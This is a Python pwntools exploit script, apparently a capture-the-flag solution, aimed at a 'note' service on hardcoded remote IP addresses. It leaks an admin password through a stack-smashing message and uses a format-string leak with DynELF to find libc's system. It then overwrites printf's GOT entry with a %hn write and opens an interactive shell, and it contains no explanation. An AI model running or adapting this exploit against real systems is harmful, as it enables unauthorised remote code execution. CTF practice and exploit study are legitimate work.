from pwn import *

HOST, PORT = '0.0.0.0', 8001
HOST, PORT = '103.237.99.74', 23509
HOST, PORT = '118.70.80.143', 23509

s = lambda: remote(HOST, PORT)
adminpassword = None
adminpassword = 'admin_password'
adminpassword = 'youcannotguessme:]]]]]]]lovely'

stage0 = p32(0x804a3c0) * 75

if adminpassword is None:
	r = s()
	r.recvuntil('> ')
	r.sendline('add')
	r.recvline()
	r.sendline('1')
	r.recvline()
	r.sendline('1')
	r.recvline()
	r.sendline(stage0)
	# r.interactive()
	r.recvuntil('*** stack smashing detected ***: ')
	adminpassword = r.recvuntil(' terminated', drop=True)
	r.close()

print adminpassword

r = s()
def leak(addr):
	if '\n' in p32(addr):
		addr -= 1
		strip = True
	else:
		strip = False
	payload = '%22$s~end'.ljust(0x40) + p32(addr)
	r.recvuntil('text : ')
	r.sendline(payload)
	data = r.recvuntil('~end', drop=True) + '\x00'
	print `data`
	if strip == True:
		data = data[1:]
	return data

r.recvuntil('> ')
r.sendline('login')
r.sendline(adminpassword)
r.recvuntil('> ')
r.sendline('game')

elf = ELF('/media/sf_j/Downloads/note')
d = DynELF(leak, 0x8048000, elf=elf)
system = d.lookup('system', 'libc')

payload = '%' + str(system & 0xffff) + 'c%22$hn%' + str((system >> 16) - (system & 0xffff) + 0x10000) + 'c%23$hn'
payload = payload.ljust(0x40) + p32(elf.got['printf']) + p32(elf.got['printf'] + 2)
r.recvuntil('text : ')
r.sendline(payload)
r.interactive()